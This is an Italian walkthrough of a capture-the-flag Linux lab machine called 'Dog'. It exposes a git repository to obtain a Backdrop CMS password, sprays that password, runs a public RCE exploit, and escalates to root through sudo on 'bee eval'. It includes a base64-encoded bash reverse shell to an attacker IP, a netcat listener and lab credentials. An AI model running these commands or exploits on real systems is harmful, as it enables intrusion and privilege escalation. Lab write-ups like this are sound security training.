---
title: Dog Walkthrough
description: Dog è una macchina Linux di difficoltà easy che comporta la lettura di informazioni sensibili attraverso un repository git esposto e l'esposizione di credenziali per ottenere l'accesso da amministratore a BackdropCMS. I privilegi di amministratore permettono a un attaccante di sfruttare un'esecuzione di codice remoto (RCE) caricando un archivio malevolo contenente una backdoor PHP per ottenere un primo accesso al sistema. L'account utente johncusack riutilizza inoltre la password di BackdropCMS. Dopo aver compromesso l'account johncusack, l'attaccante scopre che l'utente può eseguire l'eseguibile bee con privilegi sudo, il che permette di ottenere i privilegi di root.
author: dua2z3rr
date: 2025-10-24 1:00:00
categories: [Machines]
tags: ["Vulnerabilità: Remote Code Execution", "Vulnerabilità: Arbitrary File Upload", "Codice: PHP", "Codice: SQL", "Codice: Bash", "Servizio: MySQL", "Servizio: CMS", "Servizio: Git", "Tecnica: User Enumeration"]
image: /assets/img/dog/dog-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con uno scan nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -p- 10.10.11.58
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -p 80,22 -sC -sV 10.10.11.58
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vediamo che nmap ci rivela una repository di github.

### HTTP

Andiamo sulla porta 80 attraverso il browser.

![Desktop View](/assets/img/dog/dog-homepage.png)

Esiste una login page, ma non sembra exploitable. Notiamo che il sito è stato fatto con **Backdrop CMS**.

Utilizziamo il tool github_dumper per fare il dump della repository e ricostruirla.

```shell
┌─[dua2z3rr@parrot]─[~/git-dumper/git_dir]
└──╼ $ls -al
total 60
drwxr-xr-x 1 dua2z3rr dua2z3rr   164 24 ott 13.06 .
drwxr-xr-x 1 dua2z3rr dua2z3rr   178 24 ott 13.05 ..
drwxr-xr-x 1 dua2z3rr dua2z3rr   222 24 ott 13.06 core
drwxr-xr-x 1 dua2z3rr dua2z3rr   146 24 ott 13.06 files
drwxr-xr-x 1 dua2z3rr dua2z3rr   128 24 ott 13.06 .git
-rwxr-xr-x 1 dua2z3rr dua2z3rr   578 24 ott 13.06 index.php
drwxr-xr-x 1 dua2z3rr dua2z3rr    18 24 ott 13.06 layouts
-rwxr-xr-x 1 dua2z3rr dua2z3rr 18092 24 ott 13.06 LICENSE.txt
-rwxr-xr-x 1 dua2z3rr dua2z3rr  5285 24 ott 13.06 README.md
-rwxr-xr-x 1 dua2z3rr dua2z3rr  1198 24 ott 13.06 robots.txt
-rwxr-xr-x 1 dua2z3rr dua2z3rr 21732 24 ott 13.06 settings.php
drwxr-xr-x 1 dua2z3rr dua2z3rr    36 24 ott 13.06 sites
drwxr-xr-x 1 dua2z3rr dua2z3rr    18 24 ott 13.06 themes
```

Nel file **settings.php** troviamo le credenziali del db, ma non è esposto.

```php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
<SNIP>
```

### Ffuf

Vedo che quando si prova a loggarci nella admin page, si fa una richiesta all'endpoint **/account**.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://dog.htb/\?q=accounts/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dog.htb/?q=accounts/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

john                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 548ms]
tiffany                 [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 3418ms]
John                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 24ms]
morris                  [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 2251ms]
JOHN                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 28ms]
axel                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 1136ms]
```

Possiamo allora effetturare un **password spray** con la password del **database** e questi **username**. scopriremo infatti che tiffany può accedere alla admin dashboard.

![Desktop View](/assets/img/dog/dog-admin-dashboard.png)

### Admin Dashboard

Vediamo che possiamo caricare dei moduli in formato **.tar** sul sito, e quindi ottenere **RCE**. Esiste un exploit su github già pronto: <https://github.com/rvizx/backdrop-rce>.

```shell
┌─[dua2z3rr@parrot]─[~/backdrop-rce]
└──╼ $python3 exploit.py http://dog.htb tiffany BackDropJ2024DS2024
[>] logging in as user: 'tiffany'
[>] login successful
[>] enabling maintenance mode
[>] maintenance enabled
[>] payload archive: /tmp/bd_ec0w_uys/rvzcee511.tgz
[>] fetching installer form
[>] uploading payload (bulk empty)
[>] initial upload post complete
[>] batch id = 15; sending authorize ‘do_nojs’ and ‘do’
[>] waiting for shell at: http://dog.htb/modules/rvzcee511/shell.php
[>] shell is live
[>] interactive shell – type 'exit' to quit
dua2z3rr@dog.htb > whoami
www-data
dua2z3rr@dog.htb > echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDEgMD4mMQ==' | base64 -d | bash
```

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.58 50468
bash: cannot set terminal process group (937): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/rvzcee511$
```

## Shell come www-data

### Privilege Escalation

Possiamo transferire sulla macchina nemica **linpeas.sh** e eseguirlo. Farlo ci informerà che la macchina è vulnerabile alla **CVE-2021-3560**.

Tuttavia, questo non porta a nulla. 

Successivamente, ho cercato di connettermi al database per vedere se trovavo hash di password, ma non ho avuto successo.

Infine, ho provato a connettermi tramite ssh all'utente **johncusack** con la password del database.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh johncusack@10.10.11.58
johncusack@10.10.11.58's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 10 Mar 2025 11:04:07 AM UTC

  System load:           1.06
  Usage of /:            49.1% of 6.32GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             243
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.33
  IPv6 address for eth0: dead:beef::250:56ff:feb9:67d7


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 4 17:04:29 2025 from 10.10.16.9
johncusack@dog:~$
```

Spesso, la risposta corretta è sempre quella più semplice. Prendiamo la user flag e andiamo avanti.

## Shell come johncusack

### Enumerazione Interna

Come primo comando, utilizzo `sudo -l`.

```shell
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

### Bee binary

```shell
johncusack@dog:~$ sudo /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:

<SNIP>

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

Possiamo ottenere una privilege escalation tramite il comando **eval**.

```shell
johncusack@dog:/var/www/html$ sudo bee eval "system('/bin/bash')"
root@dog:/var/www/html# cd /johncusack
```

Prendiamo la root flag e terminiamo la box.
